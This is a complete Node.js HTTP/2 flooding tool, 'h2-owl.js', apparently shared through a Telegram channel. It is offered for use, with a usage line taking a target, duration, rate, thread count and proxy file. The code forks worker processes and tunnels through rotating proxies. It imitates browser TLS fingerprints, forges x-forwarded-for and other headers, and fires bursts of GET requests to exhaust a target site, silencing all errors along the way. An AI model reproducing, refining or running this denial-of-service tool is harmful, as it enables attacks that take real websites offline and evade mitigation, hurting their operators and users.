const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");

process.on('uncaughtException', (er) => {});
process.on('unhandledRejection', (er) => {});

process.on("SIGHUP", () => 1);
process.on("SIGCHILD", () => 1);

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

if (process.argv.length < 7) {
    console.log(`
Development By t.me/XATANC2API 
Usage: node h2-owl.js Host Duration Rate Thread ProxyFile
Example: node h2-owl.js https://example.com 30 50 48 proxy.txt
Options: --cookie
`);
    process.exit();
}

const XatanCiphers = "GREASE:" + [
    crypto.constants.defaultCoreCipherList.split(":")[2],
    crypto.constants.defaultCoreCipherList.split(":")[1],
    crypto.constants.defaultCoreCipherList.split(":")[0],
    crypto.constants.defaultCoreCipherList.split(":").slice(3)
].join(":");

const XatanSigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const XatanEcdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const XatanSecureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const XatanSecureProtocol = "TLS_client_method";
const XatanSecureContextOptions = {
    ciphers: XatanCiphers,
    sigalgs: XatanSigalgs,
    honorCipherOrder: true,
    secureOptions: XatanSecureOptions,
    secureProtocol: XatanSecureProtocol
};

const XatanSecureContext = tls.createSecureContext(XatanSecureContextOptions);

const XatanHeaders = {};
const XatanReadLines = (filePath) => fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
const XatanRandomIntn = (min, max) => Math.floor(Math.random() * (max - min) + min);
const XatanRandomElement = (elements) => elements[XatanRandomIntn(0, elements.length)];

const XatanArgs = {
    target: process.argv[2],
    time: process.argv[3],
    rate: process.argv[4],
    threads: process.argv[5],
    proxy: process.argv[6],
    cookie: process.argv[7] || undefined
};

const XatanAcceptHeader = [
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/plain, */*; q=0.01',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
    'text/html, application/xhtml+xml, image/jxr, */*',
    'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
    'application/javascript, */*;q=0.8',
    'text/html, text/plain; q=0.6, */*; q=0.1',
    'application/graphql, application/json; q=0.8, application/xml; q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
];

const XatanCacheHeader = [
    'max-age=0',
    'no-cache',
    'no-store', 
    'must-revalidate',
    'proxy-revalidate'
];

const XatanLanguageHeader = [
    'ru-RU,ru;q=0.9',
    'ru-RU,ru;q=0.8',
    'ru-RU,ru;q=0.7',
    'ru-RU,ru;q=0.6',
    'ru-RU,ru;q=0.5',
    'en-US,en;q=0.9', 
    'en-US,en;q=0.8', 
    'en-US,en;q=0.7', 
    'en-US,en;q=0.6', 
    'en-US,en;q=0.5', 
    '*'
];

const XatanDestHeader = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'style',
    'track',
    'video',
    'worker',
    'xslt'
];

const XatanModeHeader = [
    'cors',
    'navigate',
    'no-cors',
    'same-origin',
    'websocket'
];

const XatanSiteHeader = [
    'cross-site',
    'same-origin',
    'same-site',
    'none'
];

const XatanProxies = XatanReadLines(XatanArgs.proxy);
const XatanParsedTarget = url.parse(XatanArgs.target);

if (cluster.isMaster) {
    const dateObj = new Date();
    for (let i = 0; i < XatanArgs.threads; i++) {
        cluster.fork();
        console.log(`Threads use: ${i}`);
    }
    console.log("Attack Started");
    console.log(`Timestamp: \x1b[37m${dateObj.toDateString()} ${dateObj.toTimeString()}`);
    setTimeout(() => {}, XatanArgs.threads * 1000);
} else {
    setInterval(XatanRunFlooder);
}

class XatanNetSocket {
    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);
        connection.on("connect", () => connection.write(buffer));
        connection.on("data", (chunk) => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "403");
            }
            return callback(connection, undefined);
        });
        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "403");
        });
        connection.on("error", (error) => {
            connection.destroy();
            return callback(undefined, "403");
        });
    }
}

const XatanSocker = new XatanNetSocket();

XatanHeaders[":method"] = "GET";
XatanHeaders[":path"] = XatanParsedTarget.path;
XatanHeaders[":scheme"] = "https";
XatanHeaders["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5839.210 Safari/537.36";
XatanHeaders["accept-encoding"] = "deflate, gzip, br";
XatanHeaders["accept-language"] = "en-US,en;q=0.5";
XatanHeaders["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
XatanHeaders["connection"] = "keep-alive";
XatanHeaders["referer"] = "https://google.com/";
XatanHeaders["upgrade-insecure-requests"] = "1";
XatanHeaders["cache-control"] = "no-cache";
XatanHeaders["dnt"] = "1";
XatanHeaders["origin"] = XatanParsedTarget.host;

function XatanRunFlooder() {
    const proxyAddr = XatanRandomElement(XatanProxies);
    const parsedProxy = proxyAddr.split(":");
    XatanHeaders[":authority"] = XatanParsedTarget.host;
    XatanHeaders["x-forwarded-for"] = parsedProxy[0];
    XatanHeaders["x-forwarded-proto"] = "https";
    const proxyOptions = {
        host: parsedProxy[0],
        port: parsedProxy[1],
        address: XatanParsedTarget.host + ":443",
        timeout: 15
    };

    XatanSocker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;
        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const tlsOptions = {
            port: 443,
            ALPNProtocols: ["h2"],
            secure: true,
            ciphers: XatanCiphers,
            sigalgs: XatanSigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: XatanEcdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            servername: XatanParsedTarget.host,
            host: XatanParsedTarget.host,
            secureOptions: XatanSecureOptions,
            secureContext: XatanSecureContext,
            secureProtocol: XatanSecureProtocol
        };

        const tlsConn = tls.connect(443, XatanParsedTarget.host, tlsOptions);
        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(XatanParsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
        });

        client.setMaxListeners(0);

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < XatanArgs.rate; i++) {
                    const request = client.request(XatanHeaders)
                        .on("response", (response) => {
                            request.close();
                            request.destroy();
                            return;
                        });
                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", (error) => {
            client.destroy();
            connection.destroy();
            return;
        });
    });
}

const XatanKillScript = () => process.exit();
setTimeout(XatanKillScript, XatanArgs.time * 1000);